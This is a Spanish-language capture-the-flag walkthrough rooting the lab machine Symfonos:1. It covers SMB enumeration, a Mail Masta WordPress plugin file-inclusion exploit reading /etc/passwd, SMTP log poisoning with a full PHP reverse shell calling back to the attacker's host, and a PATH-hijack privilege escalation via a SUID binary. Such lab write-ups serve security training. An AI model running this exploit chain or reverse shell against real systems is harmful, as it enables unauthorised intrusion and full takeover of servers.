# SYMFONOS: 1

![Sir_Peter_Paul_Rubens,_The_Fall_of_Phaeton,_c _1604-1605,_probably_reworked_c _1606-1608,_NGA_71349](https://github.com/user-attachments/assets/50122476-47eb-40f7-82b5-b629703eb524)

## 1. Enumeración de hosts
```console
sudo arp-scan --interface vboxnet0 192.168.56.0/24
```

```
Interface: vboxnet0, type: EN10MB, MAC: 0a:00:27:00:00:00, IPv4: 192.168.56.1
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.2    08:00:27:65:f4:6c       PCS Systemtechnik GmbH
192.168.56.18   08:00:27:00:1e:93       PCS Systemtechnik GmbH

2 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.176 seconds (117.65 hosts/sec). 2 responded
```

## 2. Enumeración de puertos
```console
  sudo nmap -sT -sV -O 192.168.56.18
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-24 09:39 CST
Nmap scan report for 192.168.56.18
Host is up (0.00049s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
25/tcp  open  smtp        Postfix smtpd
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 08:00:27:00:1E:93 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.16 seconds
```

## 3. Enumeración del protocolo SMB
```console
smbclient -L //192.168.56.18 -N
```

```
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        helios          Disk      Helios personal share
        anonymous       Disk
        IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            SYMFONOS
```

## 3.1. Enumeración de archivos con login anónimo
```console
smbclient //192.168.56.18/anonymous -N
```

```
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jun 28 21:14:49 2019
  ..                                  D        0  Fri Jun 28 21:12:15 2019
  attention.txt                       N      154  Fri Jun 28 21:14:49 2019

                19994224 blocks of size 1024. 17263928 blocks available
smb: \> get attention.txt
getting file \attention.txt of size 154 as attention.txt (5,2 KiloBytes/sec) (average 5,2 KiloBytes/sec)
smb: \> exit
```

```
cat attention.txt
Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'!

Next person I find using one of these passwords will be fired
```

## 3.2. Enumeración de archivos en el directorio compartido "helios"
```console
smbclient //192.168.56.18/helios -U helios%qwerty
```

```
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jun 28 20:32:05 2019
  ..                                  D        0  Mon Nov 24 07:25:38 2025
  research.txt                        A      432  Fri Jun 28 20:32:05 2019
  todo.txt                            A       52  Fri Jun 28 20:32:05 2019

                19994224 blocks of size 1024. 17263924 blocks available
smb: \> get research.txt
getting file \research.txt of size 432 as research.txt (12,1 KiloBytes/sec) (average 12,1 KiloBytes/sec)
smb: \> get todo.txt
getting file \todo.txt of size 52 as todo.txt (1,9 KiloBytes/sec) (average 7,6 KiloBytes/sec)
smb: \> exit
```

```
cat research.txt todo.txt
Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.

1. Binge watch Dexter
2. Dance
3. Work on /h3l105
```

## 4. Enumeracion del gestor de contenido `wordpress` en el blog http://192.168.56.18/h3l105
```console
 echo "192.168.56.18 symfonos.local" | sudo tee -a /etc/hosts 
 # Nota: Usar http://192.168.56.18/h3l105 al especificar la url hace que no se detecten los plugins y temas de Wordpress, por eso usamos el nombre del dominio.
 wpscan --url http://symfonos.local/h3l105
```

```
 wpscan --url http://symfonos.local/h3l105
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://symfonos.local/h3l105/ [192.168.56.18]
[+] Started: Mon Nov 24 13:28:42 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.25 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://symfonos.local/h3l105/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://symfonos.local/h3l105/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://symfonos.local/h3l105/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://symfonos.local/h3l105/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.2.2 identified (Insecure, released on 2019-06-18).
 | Found By: Rss Generator (Passive Detection)
 |  - http://symfonos.local/h3l105/index.php/feed/, <generator>https://wordpress.org/?v=5.2.2</generator>
 |  - http://symfonos.local/h3l105/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.2</generator>

[+] WordPress theme in use: twentynineteen
 | Location: http://symfonos.local/h3l105/wp-content/themes/twentynineteen/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://symfonos.local/h3l105/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 3.1
 | Style URL: http://symfonos.local/h3l105/wp-content/themes/twentynineteen/style.css?ver=1.4
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://symfonos.local/h3l105/wp-content/themes/twentynineteen/style.css?ver=1.4, Match: 'Version: 1.4'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] mail-masta
 | Location: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt

[+] site-editor
 | Location: http://symfonos.local/h3l105/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://symfonos.local/h3l105/wp-content/plugins/site-editor/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <===> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Nov 24 13:28:52 2025
[+] Requests Done: 174
[+] Cached Requests: 5
[+] Data Sent: 46.76 KB
[+] Data Received: 520.694 KB
[+] Memory used: 258.578 MB
[+] Elapsed time: 00:00:09
```

## 4.1. Explotación de una vulnerabilidad en el plugin "mail-masta", versión 1.0 (LFI)
```
 # Tomado de https://www.exploit-db.com/exploits/40290 
 [+] Date: [23-8-2016]
[+] Autor Guillermo Garcia Marcos 
[+] Vendor: https://downloads.wordpress.org/plugin/mail-masta.zip
[+] Title: Mail Masta WP Local File Inclusion
[+] info: Local File Inclusion 

The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.

Source: /inc/campaign/count_of_send.php
Line 4: include($_GET['pl']);

Source: /inc/lists/csvexport.php:
Line 5: include($_GET['pl']);

Source: /inc/campaign/count_of_send.php
Line 4: include($_GET['pl']);

Source: /inc/lists/csvexport.php
Line 5: include($_GET['pl']);

Source: /inc/campaign/count_of_send.php
Line 4: include($_GET['pl']);

This looks as a perfect place to try for LFI. If an attacker is lucky enough, and instead of selecting the appropriate page from the array by its name, the script directly includes the input parameter, it is possible to include arbitrary files on the server.

Typical proof-of-concept would be to load passwd file:

http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

```console
curl http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
Debian-exim:x:105:109::/var/spool/exim4:/bin/false
messagebus:x:106:111::/var/run/dbus:/bin/false
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
helios:x:1000:1000:,,,:/home/helios:/bin/bash
mysql:x:108:114:MySQL Server,,,:/nonexistent:/bin/false
postfix:x:109:115::/var/spool/postfix:/bin/false
```

## 5. Envenenamiento de logs via SMTP (RCE)
```
 nc 192.168.56.18 25
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
VRFY helios
252 2.0.0 helios
MAIL FROM:HAXOR
250 2.1.0 Ok
RCPT TO:helios
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.56.1';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?>
.
250 2.0.0 Ok: queued as 9C8F1408A3
quit
221 2.0.0 Bye
```

```console
# shell 1
curl http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios
# shell 2
nc -lnvp 4444
```

```
nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.19] 36030
Linux symfonos 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64 GNU/Linux
 08:43:26 up 1 min,  0 users,  load average: 0.12, 0.10, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(helios) gid=1000(helios) groups=1000(helios),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
bash: cannot set terminal process group (563): Inappropriate ioctl for device
bash: no job control in this shell
```

## 6. Enumeración de programas con permisos SUID
```console
find / -perm -4000 -user root -type f -ls 2>/dev/null
```

```
find / -perm -4000 -user root -type f -ls 2>/dev/null
   525788     12 -rwsr-xr-x   1 root     root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
   529794     44 -rwsr-xr--   1 root     messagebus    42992 Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   403969    432 -rwsr-xr-x   1 root     root         440728 Mar  1  2019 /usr/lib/openssh/ssh-keysign
   393297     60 -rwsr-xr-x   1 root     root          59680 May 17  2017 /usr/bin/passwd
   393296     76 -rwsr-xr-x   1 root     root          75792 May 17  2017 /usr/bin/gpasswd
   396158     40 -rwsr-xr-x   1 root     root          40312 May 17  2017 /usr/bin/newgrp
   393294     40 -rwsr-xr-x   1 root     root          40504 May 17  2017 /usr/bin/chsh
   393293     52 -rwsr-xr-x   1 root     root          50040 May 17  2017 /usr/bin/chfn
   131108     12 -rwsr-xr-x   1 root     root           8640 Jun 28  2019 /opt/statuscheck
   655404     44 -rwsr-xr-x   1 root     root          44304 Mar  7  2018 /bin/mount
   655405     32 -rwsr-xr-x   1 root     root          31720 Mar  7  2018 /bin/umount
   655402     40 -rwsr-xr-x   1 root     root          40536 May 17  2017 /bin/su
   655427     60 -rwsr-xr-x   1 root     root          61240 Nov 10  2016 /bin/ping
```

## 6.1 Copia y análisis del binario sospechoso
```console
# shell remota
cat /opt/statuscheck | nc -lnvp 5555 -q 1
# shell local 
nc symfonos.local 5555 > statuscheck
```

```
file statuscheck; chmod u+x statuscheck; ./statuscheck
statuscheck: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4dc315d863d033acbe07b2bfc6b5b2e72406bea4, not stripped
curl: (7) Failed to connect to localhost port 80 after 0 ms: Could not connect to server
```

```
r2 -A -c "s main;pdf" statuscheck 2>/dev/null
            ; DATA XREF from entry0 @ 0x59d(r)
/ 76: int main (int argc, char **argv, char **envp);
|           ; var char *string @ rbp-0x40
|           0x000006b0      55             push rbp
|           0x000006b1      4889e5         mov rbp, rsp
|           0x000006b4      4883ec40       sub rsp, 0x40
|           0x000006b8      488d45c0       lea rax, [string]
|           0x000006bc      48ba637572..   movabs rdx, 0x20492d206c727563 ; 'curl -I '
|           0x000006c6      488910         mov qword [rax], rdx
|           0x000006c9      48b9687474..   movabs rcx, 0x6c2f2f3a70747468 ; 'http://l'
|           0x000006d3      48894808       mov qword [rax + 8], rcx
|           0x000006d7      48be6f6361..   movabs rsi, 0x74736f686c61636f ; 'ocalhost'
|           0x000006e1      48897010       mov qword [rax + 0x10], rsi
|           0x000006e5      c6401800       mov byte [rax + 0x18], 0
|           0x000006e9      488d45c0       lea rax, [string]
|           0x000006ed      4889c7         mov rdi, rax                ; const char *string
|           0x000006f0      e86bfeffff     call sym.imp.system         ; int system(const char *string)
|           0x000006f5      b800000000     mov eax, 0
|           0x000006fa      c9             leave
\           0x000006fb      c3             ret
[0x000006b0]>
```

## 6.2 PATH Hijacking
```bash
cd /tmp; export PATH=/tmp:$PATH; printf "#\!/bin/sh\n/bin/bash -p" > curl; chmod u+x curl; /opt/statuscheck
```

```
helios@symfonos:/$ cd /tmp; export PATH=/tmp:$PATH; printf "#\!/bin/sh\n/bin/bash -p" > curl; chmod u+x curl; /opt/statuscheck
<n/bash -p" > curl; chmod u+x curl; /opt/statuscheck
whoami
root
ls /root
proof.txt
cat /root/proof.txt

        Congrats on rooting symfonos:1!

                 \ __
--==/////////////[})))==*
                 / \ '          ,|
                    `\`\      //|                             ,|
                      \ `\  //,/'                           -~ |
   )             _-~~~\  |/ / |'|                       _-~  / ,
  ((            /' )   | \ / /'/                    _-~   _/_-~|
 (((            ;  /`  ' )/ /''                 _ -~     _-~ ,/'
 ) ))           `~~\   `\\/'/|'           __--~~__--\ _-~  _/,
((( ))            / ~~    \ /~      __--~~  --~~  __/~  _-~ /
 ((\~\           |    )   | '      /        __--~~  \-~~ _-~
    `\(\    __--(   _/    |'\     /     --~~   __--~' _-~ ~|
     (  ((~~   __-~        \~\   /     ___---~~  ~~\~~__--~
      ~~\~~~~~~   `\-~      \~\ /           __--~~~'~~/
                   ;\ __.-~  ~-/      ~~~~~__\__---~~ _..--._
                   ;;;;;;;;'  /      ---~~~/_.-----.-~  _.._ ~\
                  ;;;;;;;'   /      ----~~/         `\,~    `\ \
                  ;;;;'     (      ---~~/         `:::|       `\\.
                  |'  _      `----~~~~'      /      `:|        ()))),
            ______/\/~    |                 /        /         (((((())
          /~;;.____/;;'  /          ___.---(   `;;;/             )))'`))
         / //  _;______;'------~~~~~    |;;/\    /                ((   (
        //  \ \                        /  |  \;;,\                 `
       (<_    \ \                    /',/-----'  _>
        \_|     \\_                 //~;~~~~~~~~~
                 \_|               (,~~
                                    \~\
                                     ~~

        Contact me via Twitter @zayotic to give feedback!
```

